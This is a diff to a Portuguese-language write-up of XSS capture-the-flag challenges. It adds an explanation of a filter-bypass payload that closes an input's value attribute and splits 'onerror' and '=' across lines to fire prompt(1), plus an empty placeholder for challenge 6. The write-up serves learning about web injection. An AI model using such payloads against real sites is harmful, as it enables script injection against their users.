@@ -97,10 +97,25 @@ Input:
 "type=image src onerror
 ="prompt(1)
 ```
-
+Primeiro fechamos as aspas do `value="`, assim oque escrevermos não vai mais ser registrado como valor. Em seguida fornecemos ao código uma imagem falsa, assim o nosso src vai dar como erro. Mas pra conseguirmos burlar o filtro, temos de colocar o `onerror` em uma linha e o `=` em outra.
 
 HTML Source:
 ```
 <input value=""type=image src onerror
 ="prompt(1)" type="text">
+```
+
+#### Desafio 6:
+
+[![questao6.png](https://i.postimg.cc/KvV2CMBj/questao6.png)](https://postimg.cc/svpqh1nC)
+
+Input:
+```
+
+```
+resolução
+
+HTML Source:
+```
+
 ```
